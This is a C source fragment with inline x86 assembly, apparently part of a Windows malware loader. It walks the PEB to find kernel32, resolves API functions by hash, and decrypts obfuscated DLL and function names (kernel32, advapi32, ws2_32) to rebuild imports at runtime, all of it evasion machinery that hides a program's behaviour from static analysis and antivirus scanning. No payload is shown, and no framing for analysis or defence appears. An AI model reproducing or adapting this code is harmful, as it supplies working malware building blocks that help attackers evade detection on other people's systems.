DWORD WINAPI CalcHash(char *s)
{
	DWORD dwHash = 0;

    __asm 
    {
        mov     eax,s
        push    edx
        xor     edx,edx
calc_hash:
        rol     edx,3
        xor     dl,[eax]
        inc     eax
        cmp     [eax],0
        jnz     calc_hash
        mov     eax,edx
		mov		dwHash,eax
        pop     edx
    }
	return dwHash;
}
//--------------------------------------------------------------------------------------
LPVOID WINAPI GetProcAddrEx(HMODULE hModule, DWORD dwProcHash)
{
    __asm
    {
        xor     eax,eax
        mov     ebx,dwProcHash
        mov     esi,hModule
        mov     edi,esi
        add     esi,[esi+3Ch]
        mov     ecx,[esi+78h]
        add     ecx,edi
        mov     edx,[ecx+1ch]
        push    edx
        mov     edx,[ecx+24h]
        push    edx
        mov     esi,[ecx+20h]
        add     esi,edi
        cdq
        dec     edx
next_func:     
        lodsd
        inc     edx
        add     eax,hModule
        push    eax
        call    CalcHash
        cmp     eax,ebx
        jnz     next_func
        mov     eax,hModule
        xchg    eax,edx
        pop     esi
        add     esi,edx
        shl     eax,1
        add     eax,esi
        xor     ecx,ecx
        movzx   ecx,word ptr [eax]
        pop     edi
        shl     ecx,2
        add     ecx,edx
        add     ecx,edi
        mov     eax,[ecx]
        add     eax,edx
    }
}

DWORD GetKernelBase()
{
	DWORD dwKernelBase = 0;
	__asm {
		mov eax,fs:[30h]
		mov eax,[eax+0Ch]
		mov esi,[eax+1Ch]
		lodsd
		mov eax,[eax+08h]
		mov dwKernelBase,eax
	}
	return dwKernelBase;
}

BOOL ReassembleImport()
{
	DWORD dwImageBase = GetKernelBase();
	DWORD dwCount = 0;
	DWORD FuncAddr = 0;
	BOOL bRet = TRUE;
	char *ptr;

	if(!dwImageBase)
	{
		bRet = FALSE;
		goto end;
	}
	

	FuncAddr		= (DWORD)&api;
	pLoadLibrary	= GetProcAddrEx((HMODULE)dwImageBase,CalcHash(DeCrypt("\x9f\x84\x7a\x77\x9f\x82\x79\xe9\x7a\xe9\xf2\x9a")));
	pGetProcAddr	= GetProcAddrEx((HMODULE)dwImageBase,CalcHash(DeCrypt("\x9c\x7e\xe7\xa3\xe9\x84\x78\x9a\x77\x77\xe9\x7e\xe8\xe8")));

	if(!pLoadLibrary)
	{
		bRet = FALSE;
		goto end;
	}

	// kernel 32
	// advapi 32
	// ws2_32.dll
	do {

		// ++ KERNEL 32
		while(bRet)
		{
			ptr = szApiNames[dwCount];
			if(ptr)
			{
				*(DWORD *)FuncAddr = (ULONG)pGetProcAddr((HMODULE)dwImageBase,DeCrypt(ptr));
				if(!*(DWORD *)FuncAddr)
				{
#ifdef _DEBUG_
					DbgPrint("Error get function addr KERNEL 32 : %s\n",DeCrypt(ptr));
#endif
					bRet = FALSE;
				}	else	{
#ifdef _DEBUG_
					DbgPrint("Function : %-30s	: 0x%08X\n",DeCrypt(ptr),*(DWORD*)FuncAddr);
#endif
				}
			}	else	{ 
				bRet = FALSE;
				dwCount++;
				break;
			}

			dwCount++;
			FuncAddr += sizeof(DWORD);
		}

		// ADVAPI 32
		dwImageBase = (ULONG)pLoadLibrary(DeCrypt("\x7a\x77\xed\x7a\x83\x82\xa8\xa9\x45\x77\x7f\x7f"));
		bRet = TRUE;
		while(bRet)
		{ 
			ptr = szApiNames[dwCount];
			if(ptr)
			{
				*(DWORD *)FuncAddr = (ULONG)pGetProcAddr((HMODULE)dwImageBase,DeCrypt(ptr));
				if(!*(DWORD *)FuncAddr)
				{
#ifdef _DEBUG_ 
					DbgPrint("Error get function addr advapi32.dll : %s\n",DeCrypt(ptr));
#endif
					bRet = FALSE;
				}	else	{
#ifdef _DEBUG_
					DbgPrint("Function : %-30s	: 0x%08X\n",DeCrypt(ptr),*(DWORD*)FuncAddr);
#endif
				}		
			}	else	{
				bRet = FALSE;
				dwCount++;
				break;
			}

			dwCount++;
			FuncAddr += sizeof(DWORD);
		}
		
		//ws2_32.dll
		dwImageBase = (ULONG)pLoadLibrary(DeCrypt("\xec\xe8\xa9\x94\xa8\xa9\x45\x77\x7f\x7f"));		
		bRet = TRUE;
		while(bRet)
		{
			ptr = szApiNames[dwCount];
			if(ptr)
			{
				*(DWORD *)FuncAddr = (ULONG)pGetProcAddr((HMODULE)dwImageBase,DeCrypt(ptr));
				if(!*(DWORD *)FuncAddr)
				{
#ifdef _DEBUG_
					DbgPrint("Error get function addr ws2_32.dll : %s\n",ptr);
#endif
					bRet = FALSE;
				}	else	{
#ifdef _DEBUG_
					DbgPrint("Function : %-30s	: 0x%08X\n",DeCrypt(ptr),*(DWORD*)FuncAddr);
#endif
				}			
			}	else	{
				bRet = FALSE;
				dwCount++;
				break;
			}

			dwCount++;
			FuncAddr += sizeof(DWORD);
		}
	}	while (bRet);
	bRet = TRUE;	
end:
	return bRet;
}